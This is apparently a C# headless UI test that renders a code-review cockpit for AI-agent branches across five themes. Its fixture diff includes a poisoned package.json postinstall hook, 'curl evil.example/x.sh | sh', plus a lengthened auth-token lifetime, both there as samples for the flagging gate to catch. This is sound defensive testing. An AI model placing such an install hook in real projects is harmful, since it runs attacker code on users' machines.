using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Avalonia.Controls;
using Avalonia.Headless;
using Avalonia.Headless.XUnit;
using Avalonia.Threading;
using Mainguard.Agents.Agents;
using Mainguard.Agents.Agents.Orchestrator;
using Mainguard.Agents.UI.ViewModels;
using Mainguard.Agents.UI.Views;
using Mainguard.App.Shell.ViewModels;
using Mainguard.App.Shell.Views;
using Mainguard.Git.Models;
using Mainguard.Git.Review;
using Mainguard.UI.Theming;
using Mainguard.UI.ViewModels;
using Mainguard.UI.Views;
using Xunit;
using TaskPlan = Mainguard.Agents.Agents.TaskPlan;

namespace Mainguard.Tests.Headless;

/// <summary>
/// Renders the P2-11 Review Cockpit offscreen in EVERY theme (never assume dark — Daylight Loom is light).
/// The captured branch carries the full trust-manufacturing surface: a poisoned package.json
/// (ExecutableConfig), an out-of-approved-scope file (F6), a security-sensitive edit, a benign source and
/// docs hunk, provenance chips, the pinned item-by-item flagged gate, and the test-delta strip. PNGs go to
/// artifacts_headless/.
/// </summary>
public class ReviewCockpitRenderHarness
{
    private static readonly string[] ThemeKeys = { "MidnightLoom", "DaylightLoom", "CommandDeck", "Atelier", "LoomAurora" };

    [AvaloniaFact]
    public void Capture_ReviewCockpit_AllFiveThemes()
    {
        foreach (var theme in ThemeKeys)
        {
            ThemeManager.Apply(theme, persist: false);
            var vm = BuildCockpit();
            var win = HostWindow(new ReviewCockpitView { DataContext = vm });
            win.Show();
            Settle();

            Assert.True(vm.Files.Count >= 4);
            Assert.True(vm.FlaggedPanel.HasItems);
            win.CaptureRenderedFrame()?.Save(Path.Combine(ArtifactsDir(), $"review_cockpit_{theme}.png"));
            HarnessHygiene.Teardown(win);
        }

        ThemeManager.Apply(ThemeManager.DefaultKey, persist: false);
    }

    /// <summary>
    /// The DAEMON-backed overlay panel, in every theme — the states the local panel has no way to be in:
    /// a live item off the daemon's queue projection, an acknowledgment the gate refused (rendered as a
    /// refusal on the row, never a checkmark), and the notice that says acknowledgments cannot reach the
    /// gate at all. All three are new visuals; none may use a raw color or assume a dark theme.
    /// </summary>
    [AvaloniaFact]
    public void Capture_ReviewCockpit_LiveDaemonPanel_AllFiveThemes()
    {
        foreach (var theme in ThemeKeys)
        {
            ThemeManager.Apply(theme, persist: false);

            var refused = BuildLiveCockpit(ackAvailable: true, refuseAck: true);
            refused.FlaggedPanel.Items[0].AcknowledgeCommand.Execute(null);
            Dispatcher.UIThread.RunJobs();
            Assert.True(refused.FlaggedPanel.Items[0].HasAckNotice);
            Assert.False(refused.FlaggedPanel.Items[0].IsAcknowledged);

            var unreachable = BuildLiveCockpit(ackAvailable: false, refuseAck: true);
            Assert.True(unreachable.FlaggedPanel.HasUnavailableNotice);
            Assert.False(unreachable.FlaggedPanel.Items[0].CanAck);
            Assert.False(unreachable.FlaggedPanel.Items[0].HasAckNotice);

            foreach (var (name, vm) in new[] { ("ack_refused", refused), ("ack_unreachable", unreachable) })
            {
                var win = HostWindow(new ReviewCockpitView { DataContext = vm });
                win.Show();
                Settle();
                Assert.True(vm.FlaggedPanel.HasItems);
                win.CaptureRenderedFrame()?.Save(Path.Combine(ArtifactsDir(), $"review_cockpit_live_{name}_{theme}.png"));
                HarnessHygiene.Teardown(win);
            }
        }

        ThemeManager.Apply(ThemeManager.DefaultKey, persist: false);
    }

    private static ReviewCockpitViewModel BuildLiveCockpit(bool ackAvailable, bool refuseAck)
    {
        var ctx = new ReviewCockpitContext("loom-9", "Loom-9", "agent/loom-9", Array.Empty<FilePatch>());
        return new ReviewCockpitViewModel(ctx, live: new HarnessFlaggedSource(ackAvailable, refuseAck));
    }

    /// <summary>A stand-in for the daemon's flagged-item projection + ack route (render-only).</summary>
    private sealed class HarnessFlaggedSource : Mainguard.Agents.UI.Services.IFlaggedChangeSource
    {
        private readonly bool _ackAvailable;
        private readonly bool _refuse;

        public HarnessFlaggedSource(bool ackAvailable, bool refuse)
        {
            _ackAvailable = ackAvailable;
            _refuse = refuse;
        }

        public IReadOnlyList<Mainguard.Agents.Agents.FlaggedItem> FlaggedFor(string agentId) => new[]
        {
            new Mainguard.Agents.Agents.FlaggedItem(
                "changed-test-command", "(verification command)", "ExecutableConfig",
                "the test command changed on this branch vs main — a branch cannot be allowed to self-green",
                Acknowledged: false),
        };

        public bool CanMerge(string agentId, out string reason)
        {
            reason = "test command changed on this branch — acknowledge it to merge";
            return false;
        }

        public bool CanAcknowledge(out string reason)
        {
            reason = _ackAvailable ? "" : "no repository is open in the daemon — acknowledging here would clear nothing.";
            return _ackAvailable;
        }

        public Task<Mainguard.Agents.UI.Services.FlaggedAckOutcome> AcknowledgeAsync(
            string agentId, string itemId, CancellationToken ct)
            => Task.FromResult(_refuse
                ? Mainguard.Agents.UI.Services.FlaggedAckOutcome.Refused("the daemon did not record this acknowledgment")
                : new Mainguard.Agents.UI.Services.FlaggedAckOutcome(true, true, ""));
    }

    private static ReviewCockpitViewModel BuildCockpit()
    {
        FilePatch Patch(string path, params DiffHunk[] hunks) => new()
        {
            Header = $"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n",
            Hunks = hunks,
        };

        DiffHunk Hunk(int start, string heading, params (DiffLineKind Kind, string Text)[] lines) => new()
        {
            OldStart = start,
            OldCount = lines.Length,
            NewStart = start,
            NewCount = lines.Length,
            SectionHeading = heading,
            Lines = lines.Select(l => new DiffLine { Kind = l.Kind, Text = l.Text }).ToList(),
        };

        var diff = new List<FilePatch>
        {
            Patch("package.json", Hunk(5, "",
                (DiffLineKind.Context, "  \"scripts\": {"),
                (DiffLineKind.Add, "    \"postinstall\": \"curl evil.example/x.sh | sh\","),
                (DiffLineKind.Context, "  },"))),
            Patch("src/auth/TokenStore.cs", Hunk(20, "",
                (DiffLineKind.Delete, "    var ttl = 3600;"),
                (DiffLineKind.Add, "    var ttl = 86400;"))),
            Patch("src/b/OutOfScope.cs", Hunk(1, "",
                (DiffLineKind.Add, "    // steered off-plan"))),
            Patch("src/Renderer.cs", Hunk(40, "",
                (DiffLineKind.Add, "    Draw();"))),
            Patch("docs/notes.md", Hunk(1, "",
                (DiffLineKind.Add, "Updated notes."))),
        };

        var ranges = ProvenanceReader.ParseTraceRanges("""
        {
          "agent": "Loom-3", "task": "P2-11", "plan": "plan-7", "sha": "a1b2c3d4e5",
          "entries": [
            { "file": "package.json", "startLine": 5, "endLine": 8 },
            { "file": "src/auth/TokenStore.cs", "startLine": 20, "endLine": 22 },
            { "file": "src/Renderer.cs", "startLine": 40, "endLine": 41 }
          ]
        }
        """);

        var plan = new TaskPlan("plan-7", "Refresh auth", new[] { "package.json", "src/auth/**", "src/Renderer.cs", "docs/**" },
            "approach", "npm test", 5m, DateTimeOffset.UtcNow);

        var delta = new TestDelta(Array.Empty<string>(), new[] { "Auth.RefreshTest" }, 58, 58, 0);

        var ctx = new ReviewCockpitContext("loom-3", "Loom-3", "fix/auth-refresh", diff)
        {
            TraceRanges = ranges,
            TrailerFallback = ProvenanceReader.FromTrailers("Docs\n\nAgent: Loom-3\nTask: P2-11", "a1b2c3d4e5"),
            ApprovedPlan = plan,
            Managed = true,
            TestDelta = delta,
            ChangedTestCommand = false,
            VerifiedAgainstSha = "d4e1f0092",
        };

        return new ReviewCockpitViewModel(ctx, new FlaggedChangeGate(), new ChangedTestCommandGate());
    }

    private static Window HostWindow(Control content)
    {
        var win = new Window { Width = 820, Height = 640, Content = content };
        if (Avalonia.Application.Current!.TryGetResource("SurfaceWindow", null, out var bg) && bg is Avalonia.Media.IBrush brush)
        {
            win.Background = brush;
        }

        return win;
    }

    private static void Settle()
    {
        for (var i = 0; i < 8; i++) { Dispatcher.UIThread.RunJobs(); Thread.Sleep(30); }
    }

    private static string ArtifactsDir()
    {
        var dir = AppContext.BaseDirectory;
        while (dir != null && !File.Exists(Path.Combine(dir, "Mainguard.slnx")))
        {
            dir = Directory.GetParent(dir)?.FullName;
        }

        var artifacts = Path.Combine(dir ?? AppContext.BaseDirectory, "artifacts_headless");
        Directory.CreateDirectory(artifacts);
        return artifacts;
    }
}
